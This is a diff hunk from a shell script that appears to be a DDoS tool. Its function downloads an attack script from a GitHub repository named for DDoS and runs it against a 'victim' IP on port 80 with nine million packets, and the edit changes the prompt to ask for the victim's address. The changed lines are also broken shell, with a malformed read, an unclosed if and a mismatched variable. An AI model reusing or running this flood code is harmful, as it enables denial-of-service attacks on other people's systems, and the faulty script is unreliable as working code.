@@ -27,8 +27,8 @@ done
 distractionscan()
 {
 wget https://raw.githubusercontent.com/maellambong/DDos-Tool-MrA-/master/pnt.py
-echo 'enter target IP'
-read -i $TARGET 
+read "please Enter Your i' Victim $ip : " IP
+if [ "$IP" = "$ip" ]; then
 python2 pnt.py $TARGET 80 9000000
 }
 
